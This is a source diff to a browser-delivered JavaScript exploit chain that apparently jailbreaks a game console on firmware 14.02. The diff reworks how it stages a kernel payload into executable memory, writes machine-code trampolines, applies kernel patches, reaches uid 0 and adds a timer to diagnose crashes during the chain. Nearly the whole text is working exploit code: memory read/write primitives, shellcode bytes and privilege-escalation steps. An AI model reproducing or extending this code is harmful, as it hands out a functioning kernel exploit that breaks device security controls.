@@ -128,7 +128,7 @@ function host() {
 function say(fmt) {
   host().mark("AG", fmt);
   try {
-    if (/^\[(e|g|p|t|8|9|10|kp|rw)\]/.test(fmt) || /JAILBREAK|defused|thread rc|pthread_create/.test(fmt)) {
+    if (/^\[(e|g|p|t|7b|8|9|10|kp|rw)\]/.test(fmt) || /JAILBREAK|defused|thread rc|pthread_create/.test(fmt)) {
       fetch("ag_log?m=" + encodeURIComponent(fmt), { keepalive: true }).catch(function () {});
     }
   } catch (e) {}
@@ -138,6 +138,26 @@ function say(fmt) {
    does. Without one the whole ring 0 stretch paints as a single line. */
 function nap(ms) {
   return new Promise(function (ok) { setTimeout(ok, ms || 350); });
+}
+
+/* The log freezes with the page, so it cannot say when the page stopped. This
+   clock sits in the status line above the log and repaints from its own timer
+   every 100 ms: whatever it reads at a crash is the last moment the main
+   thread was alive, and the phase names the last line that got there. */
+let deadT0 = 0, deadPhase = "pre-gate", deadEl = null;
+function deadPaint() {
+  if (!deadEl && typeof document !== "undefined") deadEl = document.getElementById("state");
+  if (!deadEl) return;
+  const s = Date.now() - deadT0;
+  deadEl.textContent = "ALIVE " + (s / 1000).toFixed(2) + " s  |  " + deadPhase;
+}
+function deadbeat(phase) {
+  if (!deadT0) {
+    deadT0 = Date.now();
+    if (typeof setInterval === "function") setInterval(deadPaint, 100);
+  }
+  if (phase) deadPhase = phase;
+  deadPaint();
 }
 
 const LOW = 0x100000000;
@@ -1176,7 +1196,7 @@ async function loadRawKernel(url, k, kbase, room, vorab) {
 }
 
 
-/* Kpayload step-driver. 1402zl: the payload's firmware probe is bypassed,
+/* Kpayload step-driver. 1402zm: the payload's firmware probe is bypassed,
    not moved. 0x115be scans [base+0x1300000, +0x2200000) one byte at a time
    and that window opens in the unmapped hole above the RELRO segment here --
    one read is a panic. Nineteen sites across the payload call it, so the
@@ -1200,9 +1220,10 @@ const KP_MAX_STEPS = 1;   /* diagnostic: name one new ring-0 call per boot */
 
 async function loadKpayloadSteps(k, kbase, room) {
   const c = host();
+  const ksay = function (m) { say(m); deadbeat(m.replace(/^\[kp\]\s*/, "").slice(0, 60)); };
   const blob = await fetchBytes("kpayload.bin", "kp");
-  if (!blob || !blob.length) { say("[kp] kpayload.bin not available"); return false; }
-  say("[kp] " + blob.length + " bytes inflated kpayload");
+  if (!blob || !blob.length) { ksay("[kp] kpayload.bin not available"); return false; }
+  ksay("[kp] " + blob.length + " bytes inflated kpayload");
 
   const size = (0x50000 + blob.length + 0x4fff) & ~0xfff;
   const m = sc(S.mmap, 0, size + 0x1000, 3, 0x1002, -1, 0);
@@ -1210,24 +1231,40 @@ async function loadKpayloadSteps(k, kbase, room) {
   const data = plus(buf, 0x50000);
   if (m.i32 === -1 || (buf.hi >>> 0) === 0) { say("[kp] mmap failed, errno " + c.errno()); return false; }
   for (let o = 0; o <= size; o += 0x1000) wr4(plus(buf, o), 0);
-  if (sc(S.mprotect, buf, size + 0x1000, 7).i32 !== 0) { say("[kp] mprotect rwx failed"); return false; }
+  if (sc(S.mprotect, buf, size + 0x1000, 7).i32 !== 0) { ksay("[kp] mprotect rwx failed"); return false; }
   codeAt(buf, GH.tor).hex("4831c0").hex("4989ca").hex("0f05").hex("c3");
   codeAt(buf, GH.tram + 0x200).hex("c3");
   const r3 = c.callAddr(plus(buf, GH.tram + 0x200), []);
-  if (r3 === undefined || r3 === null) { say("[kp] gate page does not execute in ring 3"); return false; }
-  say("[kp] gate page executes in ring 3");
+  if (r3 === undefined || r3 === null) { ksay("[kp] gate page does not execute in ring 3"); return false; }
+  ksay("[kp] gate page executes in ring 3");
 
+  /* These two loops run about a hundred thousand times. A fresh int64 per
+     address and per value is a dozen closures each in this class -- millions
+     of short-lived cells, and the first idle collection after the burst is
+     exactly where every build so far has stopped painting. The cursor and the
+     word are mutated in place; the primitive reads low/hi and allocates
+     nothing of its own. */
+  const cur = new int64(data.low, data.hi);
+  const word = new int64(0, 0);
   for (let o = 0; o < blob.length; o += 8) {
     let lo = 0, hi = 0;
     for (let j = 0; j < 4; j++) lo |= (blob[o + j] || 0) << (8 * j);
     for (let j = 0; j < 4; j++) hi |= (blob[o + 4 + j] || 0) << (8 * j);
-    c.p.write8(plus(data, o), v(lo >>> 0, hi >>> 0));
+    word.low = lo >>> 0; word.hi = hi >>> 0;
+    c.p.write8(cur, word);
+    cur.add32inplace(8);
   }
   /* A loader maps memsz-filesz as zero-filled .bss. The flat copy leaves the
      section-name table sitting in it, and patch group 1 dereferences those
      words as pointers. Everything past the last loadable byte goes to zero. */
-  for (let o = 0x98380; o < blob.length; o += 8) c.p.write8(plus(data, o), v(0, 0));
-  say("[kp] kpayload staged at " + text(data) + ", .bss cleared");
+  cur.low = data.low; cur.hi = data.hi;
+  cur.add32inplace(0x98380);
+  word.low = 0; word.hi = 0;
+  for (let o = 0x98380; o < blob.length; o += 8) {
+    c.p.write8(cur, word);
+    cur.add32inplace(8);
+  }
+  ksay("[kp] kpayload staged at " + text(data) + ", .bss cleared");
 
   STATE.haltChain = true;    /* whatever happens below, stop after this step */
 
@@ -1236,8 +1273,8 @@ async function loadKpayloadSteps(k, kbase, room) {
      just init -- safe from the unmapped scan window. */
   wr1(plus(data, 0x98488), 0x7a);
   wr1(plus(data, 0x98489), 0x05);
-  say("[kp] version word preset to 0x57a -- the ring-0 scan never runs");
-  await nap(300);
+  ksay("[kp] version word preset to 0x57a -- the ring-0 scan never runs");
+  await nap(40);
 
   const tram = { n: 0 };
   const b1 = function (x) { wr1(plus(buf, GH.tram + tram.n), x); tram.n++; };
@@ -1251,25 +1288,26 @@ async function loadKpayloadSteps(k, kbase, room) {
   const markClear = function () { wr4(plus(buf, GH.mark), 0xDEADBEEF); wr4(plus(buf, GH.mark + 4), 0xDEADBEEF); };
   const markRead = function () { return [rd4(plus(buf, GH.mark)), rd4(plus(buf, GH.mark + 4))]; };
 
-  say("[kp] kernel base " + text(kbase) + ", payload at " + text(data)
+  ksay("[kp] kernel base " + text(kbase) + ", payload at " + text(data)
       + " -- patchset and padding pde skipped this build");
-  await nap(300);
+  await nap(40);
 
   const magic = c.p.read4(data);
-  if ((magic >>> 0) !== 0x464c457f) { say("[kp] staged blob lost its ELF magic"); return false; }
+  if ((magic >>> 0) !== 0x464c457f) { ksay("[kp] staged blob lost its ELF magic"); return false; }
 
   /* Same body every k.read/k.write above already ran: if the gate lost the
      base, stop before it is pointed at a payload function. */
   const hb = k.base();
   if (!hb || !same(hb, kbase)) {
-    say("[kp] gate heartbeat lost the base -- not firing");
+    ksay("[kp] gate heartbeat lost the base -- not firing");
     await nap(300);
     return false;
   }
-  say("[kp] gate heartbeat " + text(hb) + ", firing step 1 next");
-  await nap(300);
-  say("[kp] idle window spent, building tram");
-  await nap(250);
+  /* Nothing between here and the call is allowed to idle: every build so far
+     stopped painting ~0.5 s after this heartbeat, in the first long nap after
+     the staging burst. The tram is built straight away and a single 120 ms
+     frame carries this line, the tram line and SYNC to the screen. */
+  ksay("[kp] gate heartbeat " + text(hb) + " -- tram and step 1 in one paint window");
 
   let silent = 0;
   for (let n = 0; n < KP_MAX_STEPS; n++) {
@@ -1292,41 +1330,43 @@ async function loadKpayloadSteps(k, kbase, room) {
     hex("48b9"); q64(plus(buf, GH.mark)); hex("488901");
     hex("488b2424");               /* rsp = [rsp] */
     wpOn(); hex("31c0"); hex("c3");
-    say("[kp] tram built (" + tram.n + " bytes), firing now");
-    await nap(250);
-    say("[kp] SYNC entering [" + (n + 1) + "] 0x" + rva.toString(16) + " " + what + " (host stack)");
-    await nap(400);
+    ksay("[kp] tram built (" + tram.n + " bytes), firing now");
+    ksay("[kp] SYNC entering [" + (n + 1) + "] 0x" + rva.toString(16) + " " + what + " (host stack)");
+    deadbeat("FIRE [" + (n + 1) + "] 0x" + rva.toString(16));
+    await nap(120);
     fire();
     const mk = markRead();
     if (mk[1] === 0xDEADBEEF) {
-      say("[kp] [" + (n + 1) + "] 0x" + rva.toString(16) + " did NOT come back -- " + what);
+      ksay("[kp] [" + (n + 1) + "] 0x" + rva.toString(16) + " did NOT come back -- " + what);
       silent++;
       break;
     }
     let rc = mk[0];
     if (mk[1] === 0xffffffff) rc = mk[0] - 0x100000000;
-    say("[kp] [" + (n + 1) + "] rc=" + rc + " -- " + what);
+    ksay("[kp] [" + (n + 1) + "] rc=" + rc + " -- " + what);
     const ver = rd4(plus(data, 0x98488)) & 0xffff;
     const q0 = rd8(plus(data, 0x986f8));
     const exp0 = plus(kbase, 0x1c0);
-    say("[kp] version word 0x" + ver.toString(16) + ", table[0] " + text(q0)
+    ksay("[kp] version word 0x" + ver.toString(16) + ", table[0] " + text(q0)
         + (same(q0, exp0) ? " -- matches base+0x1c0" : " -- MISMATCH, wanted " + text(exp0)));
     if (rc !== 0 || ver !== 0x57a || !same(q0, exp0)) {
-      say("[kp] step 1 did not leave the expected table -- stopping");
+      ksay("[kp] step 1 did not leave the expected table -- stopping");
       await nap(400);
       return false;
     }
   }
 
-  say("[kp] step 1 returned cleanly -- 1402zl stops the chain here on purpose");
-  await nap(500);
-  say("[kp] idle heartbeat 1 of 3 after step 1");
-  await nap(700);
-  say("[kp] idle heartbeat 2 of 3 after step 1");
-  await nap(700);
-  say("[kp] idle heartbeat 3 of 3 after step 1");
-  await nap(700);
-  say("[kp] still alive after the idle window -- step 1 is clean");
+  ksay("[kp] step 1 returned cleanly -- 1402zm stops the chain here on purpose");
+  await nap(400);
+  ksay("[kp] idle heartbeat 1 of 4 after step 1");
+  await nap(400);
+  ksay("[kp] idle heartbeat 2 of 4 after step 1");
+  await nap(400);
+  ksay("[kp] idle heartbeat 3 of 4 after step 1");
+  await nap(400);
+  ksay("[kp] idle heartbeat 4 of 4 after step 1");
+  await nap(400);
+  ksay("[kp] still alive after the idle window -- step 1 is clean");
   return false;
 }/* ------------------------------------------------------- GoldHEN */
 
@@ -2394,6 +2434,7 @@ async function attempt(ctx, opts) {
     return false;
   }
   say("[7] gate is live, thread " + text(thread));
+  deadbeat("gate live, resolving patches");
 
   /* From here the kernel is open AND the handles are armed. Any abort
      between here and [10] used to leave them that way. The next process exit
@@ -2455,7 +2496,14 @@ async function attempt(ctx, opts) {
         if (nb[0] === 0x90 && t[0] === 0x0F && t[1] >= 0x80 && t[1] <= 0x8f) { best = SHIFTS[s]; break; }
       }
       if (best > 0) {
-        say("[7b] " + PATCHES[i][2] + " shifted +" + best + " -> 0x" + (off + best).toString(16));
+        /* The original offset is where 14.00 had the site; its live bytes say
+           what 14.02 actually put there, which is how the next port decides
+           whether the shift found the same instruction or a lookalike. */
+        const was = k.read(kat(off), 6);
+        let wh = "";
+        if (was) for (let j = 0; j < was.length; j++) wh += (was[j] < 16 ? "0" : "") + was[j].toString(16);
+        say("[7b] " + PATCHES[i][2] + " shifted +" + best + " -> 0x" + (off + best).toString(16)
+            + (wh ? ("  (0x" + off.toString(16) + " live " + wh + ")") : ""));
         PATCHES[i][0] = off + best;
         applyList.push(PATCHES[i]);
         adj++;
@@ -2486,6 +2534,7 @@ async function attempt(ctx, opts) {
   }
   say("[8] " + done + " of " + applyList.length + " confirmed kernel patches in place"
       + (failed ? (" -- first missing: " + failed) : ""));
+  deadbeat("patched " + done + "/" + applyList.length);
   if (done < applyList.length) { return failOut("     refusing to go on with a half patched kernel"); }
 
   const proc = k.read_v(plus(thread, 0x08));
@@ -2521,6 +2570,7 @@ async function attempt(ctx, opts) {
 
   if (sc(S.getuid).i32 !== 0) { return failOut("[9] still not root"); }
   say("[9] jailbroken, uid 0");
+  deadbeat("uid 0, handing over the interface");
 
   /* ---- hand the host its kernel interface ------------------------------ */
 
@@ -2573,13 +2623,14 @@ async function attempt(ctx, opts) {
   say(iface.defused
       ? "handles defused -- this page may close"
       : "the handles are NOT defused -- do not let this page close");
+  deadbeat(iface.defused ? "handles defused" : "handles NOT defused");
 
   const want = (ctx.params && ctx.params.get("payload"));
   const mode = (ctx.params && ctx.params.get("mode")) || "";
   if (mode === "kpstep") {
     iface.payload = await loadKpayloadSteps(k, kbase, hostFree);
     if (STATE.haltChain) {
-      say("[kp] 1402zl diagnostic build -- stopping before the debug-settings pass");
+      say("[kp] 1402zm diagnostic build -- stopping before the debug-settings pass");
       return iface;
     }
   } else if (want !== "") {
